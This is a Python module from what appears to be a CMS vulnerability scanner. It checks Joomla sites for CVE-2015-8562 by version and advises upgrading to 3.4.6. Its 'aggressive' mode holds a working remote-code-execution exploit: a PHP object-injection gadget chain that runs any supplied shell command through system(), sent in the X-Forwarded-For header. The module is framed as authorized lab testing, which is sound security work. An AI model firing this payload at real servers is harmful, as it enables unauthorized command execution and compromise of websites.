from __future__ import annotations

from ...core.http import HttpClient, normalize_url
from ...core.models import Finding

CVECheckResult = Finding
from ...core.versions import version_in_specifier

CVE_ID = "CVE-2015-8562"
NAME = "Joomla core PHP object injection via HTTP headers"
COMPONENT = "Joomla core"
PATCHED_VERSION = "3.4.6"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["1.5.x", "2.x", "3.x < 3.4.6"]
AFFECTED_RULE = "Joomla 1.5.x, 2.x, and 3.x before 3.4.6"
DEFAULT_AGGRESSIVE_COMMAND = "uname -a"


def affects_joomla_version(joomla_version: str | None) -> bool:
    return bool(
        version_in_specifier(joomla_version, ">=1.5.0,<1.6.0")
        or version_in_specifier(joomla_version, ">=2.5.0,<2.6.0")
        or version_in_specifier(joomla_version, ">=3.0.0,<3.4.6")
    )


def php_str_noquotes(data: str) -> str:
    return ".".join(f"chr({ord(char)})" for char in data)


def generate_payload(php_payload: str) -> str:
    php_payload = f"eval({php_str_noquotes(php_payload)})"
    terminate = "\xf0\xfd\xfd\xfd"
    injected_payload = f"{php_payload};JFactory::getConfig();exit"
    exploit = (
        '}__test|O:21:"JDatabaseDriverMysqli":3:{'
        's:2:"fc";O:17:"JSimplepieFactory":0:{}'
        's:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;'
        'O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}'
        's:8:"feed_url";'
        f's:{len(injected_payload)}:"{injected_payload}"'
        ';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;'
        's:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}'
        's:13:"\\0\\0\\0connection";b:1;}'
        + terminate
    )
    return exploit


def send_payload(target_url: str, payload: str, timeout: int = 12, proxy: str | None = None) -> list[int]:
    client = HttpClient(timeout=timeout, proxy=proxy, user_agent="Mozilla/5.0 ProofCMS authorized-lab")
    headers = {"X-Forwarded-For": payload}
    statuses: list[int] = []
    for _ in range(4):
        resp = client.request(target_url, headers=headers, timeout=timeout)
        statuses.append(resp.get("status", 0))
    return statuses


def passive_result(joomla_version: str | None) -> Finding:
    if not joomla_version:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Joomla was detected, but the core version could not be determined.",
            action=f"Manually verify the Joomla core version. Upgrade to {PATCHED_VERSION} or later if affected.",
        )

    if affects_joomla_version(joomla_version):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=joomla_version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=(
                f"Joomla {joomla_version} is in the affected range for PHP object "
                "injection via HTTP headers."
            ),
            action=f"Upgrade Joomla core to {PATCHED_VERSION} or later immediately.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="PATCHED",
        confidence="HIGH",
        component=COMPONENT,
        component_version=joomla_version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"Joomla {joomla_version} is outside the affected range.",
        action=f"Keep Joomla core at {PATCHED_VERSION} or later.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check or result.status != "LIKELY_VULNERABLE":
        return result

    if exploit_mode != "aggressive":
        result.detail += " Safe exploit verification is not available for this blind RCE CVE."
        return result

    command = aggressive_command or DEFAULT_AGGRESSIVE_COMMAND
    php = f"system({command!r});"
    payload = generate_payload(php)
    target = normalize_url(target_url) + "/"
    statuses = send_payload(target, payload, timeout=timeout, proxy=proxy)
    result.status = "AGGRESSIVE_SENT"
    result.confidence = "LOW"
    result.exploit_ran = True
    result.detail = (
        "Aggressive blind RCE payload was sent using the X-Forwarded-For header. "
        f"Command: {'custom command' if aggressive_command else DEFAULT_AGGRESSIVE_COMMAND + ' (default)'}. "
        f"HTTP statuses observed: {statuses}. Because this CVE is blind, command "
        "execution is not confirmed by response body."
    )
    result.action = f"Treat as a lab-only exploit attempt. Upgrade Joomla core to {PATCHED_VERSION} or later."
    return result


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.3.0",
        "last_reviewed": "2026-10-02",
        "updated": "2026-10-02",
        "required_detectors": [],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2015-8562",
        ],
    }
